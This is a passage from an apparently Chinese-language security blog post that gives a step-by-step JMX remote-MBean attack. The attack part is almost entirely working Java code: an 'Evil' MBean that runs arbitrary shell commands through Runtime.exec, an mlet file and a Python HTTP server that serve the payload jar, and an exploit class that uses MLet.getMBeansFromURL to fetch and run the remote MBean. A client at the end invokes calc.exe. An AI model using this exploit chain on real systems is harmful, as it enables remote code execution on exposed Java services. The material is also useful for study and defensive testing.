+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">Evil</span> <span style="color:#ff636f">implements</span> <span style="color:#58a1dd">EvilMBean</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">runCommand</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">cmd</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Runtime</span> <span style="color:#58a1dd">rt</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">getRuntime</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Process</span> <span style="color:#58a1dd">proc</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">rt</span>.<span style="color:#58a1dd">exec</span>(<span style="color:#58a1dd">cmd</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">BufferedReader</span> <span style="color:#58a1dd">stdInput</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">BufferedReader</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">InputStreamReader</span>(<span style="color:#58a1dd">proc</span>.<span style="color:#58a1dd">getInputStream</span>()));
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">BufferedReader</span> <span style="color:#58a1dd">stdError</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">BufferedReader</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">InputStreamReader</span>(<span style="color:#58a1dd">proc</span>.<span style="color:#58a1dd">getErrorStream</span>()));
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">stdout_err_data</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">s</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">while</span> ((<span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">stdInput</span>.<span style="color:#58a1dd">readLine</span>()) <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">stdout_err_data</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">s</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">while</span> ((<span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">stdError</span>.<span style="color:#58a1dd">readLine</span>()) <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">stdout_err_data</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">s</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;\n&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">proc</span>.<span style="color:#58a1dd">waitFor</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">stdout_err_data</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">return</span> <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">toString</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>随后将上述两个java程序编译后打包成jar包：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">javac</span> <span style="color:#58a1dd">Evil</span>.<span style="color:#58a1dd">java</span> <span style="color:#58a1dd">EvilMBean</span>.<span style="color:#58a1dd">java</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">jar</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">cvf</span> <span style="color:#58a1dd">JMXPayload</span>.<span style="color:#58a1dd">jar</span> <span style="color:#58a1dd">Evil</span>.<span style="color:#58a1dd">class</span> <span style="color:#58a1dd">EvilMBean</span>.<span style="color:#58a1dd">class</span></span></span></code></pre></div><p>Step 3：再创建一个名为mlet的文件，该文件是给getMBeansFromURL函数使用的，通过该文件getMBeansFromURL会到远程下载JMXPayload.jar文件，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">mlet</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">code</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;JMX.Evil&#34;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">archive</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;JMXPayload.jar&#34;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;MLetCompromise1:name=Evil,id=10&#34;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">codebase</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://127.0.0.1:4141&#34;</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">mlet</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>参数说明：</p>
+<ul>
+<li>JMXPayload.jar：EvilMBean的jar包，Evil为Evil的路径(需要看是否有包(package))</li>
+<li>name：名称可以进行自定义，为步骤2创建的MBean
+<ul>
+<li><strong><code>MLetCompromise1</code></strong> → 这是 Domain（可以自定义，通常攻击者会用随机或伪装名称）。</li>
+<li><strong><code>name=Evil</code></strong> → 表示这个 MBean 的逻辑名称是 <code>Evil</code>（通常对应类名）。</li>
+<li><strong><code>id=10</code></strong> → 自定义属性（可省略）。</li>
+</ul>
+</li>
+<li>codebase：路径为Http Server地址，可通过python -m快速创建</li>
+</ul>
+<p>Step 4：随后将JMXPayload.jar和mlet放在网站同一目录下并启动一个简易的Web服务器</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">python2</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">m</span> <span style="color:#58a1dd">SimpleHTTPServer</span> <span style="color:#58a1dd">4141</span></span></span></code></pre></div><p>Step 5：启动JMXServer作为服务端</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.MBeanServer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorServer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorServerFactory</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXServiceURL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.lang.management.ManagementFactory</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.MalformedURLException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.registry.LocateRegistry</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">JMXServer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">MBeanServer</span> <span style="color:#58a1dd">mbs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ManagementFactory</span>.<span style="color:#58a1dd">getPlatformMBeanServer</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">LocateRegistry</span>.<span style="color:#58a1dd">createRegistry</span>(<span style="color:#58a1dd">9999</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">JMXServiceURL</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">JMXServiceURL</span>(<span style="color:#a6be9d">&#34;service:jmx:rmi:///jndi/rmi://127.0.0.1:9999/jmxrmi&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">JMXConnectorServer</span> <span style="color:#58a1dd">cs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JMXConnectorServerFactory</span>.<span style="color:#58a1dd">newJMXConnectorServer</span>(<span style="color:#58a1dd">url</span>, <span style="color:#ff636f">null</span>, <span style="color:#58a1dd">mbs</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;....................begin rmi start.....&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">cs</span>.<span style="color:#58a1dd">start</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;....................rmi start.....&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">MalformedURLException</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">IOException</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>Step 6：构建ExploitJMXByRemoteMBean并启动</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">JMX_Remote</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.MBeanServerConnection</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.ObjectInstance</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.ObjectName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnector</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorFactory</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXServiceURL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.InetAddress</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.MalformedURLException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.HashSet</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.Iterator</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">ExploitJMXByRemoteMBean</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//            connectAndOwn(args[0], args[1], args[2]);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">connectAndOwn</span>(<span style="color:#a6be9d">&#34;localhost&#34;</span>,<span style="color:#a6be9d">&#34;9999&#34;</span>,<span style="color:#a6be9d">&#34;hostname&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">connectAndOwn</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">serverName</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">port</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">command</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">MalformedURLException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// step1. 通过rmi创建 jmx连接</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">JMXServiceURL</span> <span style="color:#58a1dd">u</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">JMXServiceURL</span>(<span style="color:#a6be9d">&#34;service:jmx:rmi:///jndi/rmi://&#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">serverName</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;:&#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">port</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;/jmxrmi&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;URL: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">u</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34;, connecting&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">JMXConnector</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JMXConnectorFactory</span>.<span style="color:#58a1dd">connect</span>(<span style="color:#58a1dd">u</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Connected: &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">c</span>.<span style="color:#58a1dd">getConnectionId</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">MBeanServerConnection</span> <span style="color:#58a1dd">m</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">c</span>.<span style="color:#58a1dd">getMBeanServerConnection</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// step2. 加载特殊MBean：javax.management.loading.MLet</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">ObjectInstance</span> <span style="color:#58a1dd">evil_bean</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">ObjectInstance</span> <span style="color:#58a1dd">evil</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">evil</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">m</span>.<span style="color:#58a1dd">createMBean</span>(<span style="color:#a6be9d">&#34;javax.management.loading.MLet&#34;</span>, <span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">javax</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">InstanceAlreadyExistsException</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">evil</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">m</span>.<span style="color:#58a1dd">getObjectInstance</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectName</span>(<span style="color:#a6be9d">&#34;DefaultDomain:type=MLet&#34;</span>));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// step3：通过MLet加载远程恶意MBean</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Loaded &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">evil</span>.<span style="color:#58a1dd">getClassName</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">res</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">m</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#58a1dd">evil</span>.<span style="color:#58a1dd">getObjectName</span>(), <span style="color:#a6be9d">&#34;getMBeansFromURL&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>
+</span></span><span style="display:flex;"><span>                            { <span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">format</span>(<span style="color:#a6be9d">&#34;http://%s:4141/mlet&#34;</span>, <span style="color:#58a1dd">InetAddress</span>.<span style="color:#58a1dd">getLocalHost</span>().<span style="color:#58a1dd">getHostAddress</span>()) },
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">new</span> <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getName</span>() } );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">HashSet</span> <span style="color:#58a1dd">res_set</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">HashSet</span>)<span style="color:#58a1dd">res</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Iterator</span> <span style="color:#58a1dd">itr</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">res_set</span>.<span style="color:#58a1dd">iterator</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">nextObject</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">itr</span>.<span style="color:#58a1dd">next</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">nextObject</span> <span style="color:#ff636f">instanceof</span> <span style="color:#58a1dd">Exception</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">throw</span> ((<span style="color:#58a1dd">Exception</span>)<span style="color:#58a1dd">nextObject</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">evil_bean</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">ObjectInstance</span>)<span style="color:#58a1dd">nextObject</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">// step4: 执行恶意MBean</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Loaded class: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">evil_bean</span>.<span style="color:#58a1dd">getClassName</span>()<span style="color:#ff636f">+</span><span style="color:#a6be9d">&#34; object &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">evil_bean</span>.<span style="color:#58a1dd">getObjectName</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Calling runCommand with: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">command</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">m</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#58a1dd">evil_bean</span>.<span style="color:#58a1dd">getObjectName</span>(), <span style="color:#a6be9d">&#34;runCommand&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{ <span style="color:#58a1dd">command</span> }, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span>{ <span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getName</span>() });
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Result: &#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">result</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>随后使用Jconsole连接查看添加的MBean：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211543522.png" alt="image-20250521154351438" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211543522.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211543522.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211543522.png?size=large 2x" data-title="image-20250521154351438" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>尝试执行命令：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211544181.png" alt="image-20250521154436079" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211544181.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211544181.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211544181.png?size=large 2x" data-title="image-20250521154436079" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>此时我们也可以通过编写客户端来实现对已注册的MBean的方法调用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">JMX_Remote</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.MBeanServerConnection</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.ObjectName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnector</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorFactory</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXServiceURL</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">Client</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">Exception</span>, <span style="color:#58a1dd">NullPointerException</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">JMXServiceURL</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">JMXServiceURL</span>
+</span></span><span style="display:flex;"><span>                (<span style="color:#a6be9d">&#34;service:jmx:rmi:///jndi/rmi://localhost:9999/jmxrmi&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">JMXConnector</span> <span style="color:#58a1dd">jmxc</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JMXConnectorFactory</span>.<span style="color:#58a1dd">connect</span>(<span style="color:#58a1dd">url</span>,<span style="color:#ff636f">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">MBeanServerConnection</span> <span style="color:#58a1dd">mbsc</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">jmxc</span>.<span style="color:#58a1dd">getMBeanServerConnection</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectName</span> <span style="color:#58a1dd">mbeanName</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectName</span>(<span style="color:#a6be9d">&#34;MLetCompromise1:name=Evil,id=10&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;MBean count = &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">mbsc</span>.<span style="color:#58a1dd">getMBeanCount</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">mbsc</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#58a1dd">mbeanName</span>, <span style="color:#a6be9d">&#34;runCommand&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{ <span style="color:#a6be9d">&#34;calc.exe&#34;</span> }, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span>{ <span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getName</span>() });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h2 id="远程-jmx-访问" class="heading-element"><span><strong>远程 JMX 访问</strong></span>
+  <a href="#%e8%bf%9c%e7%a8%8b-jmx-%e8%ae%bf%e9%97%ae" class="heading-mark">
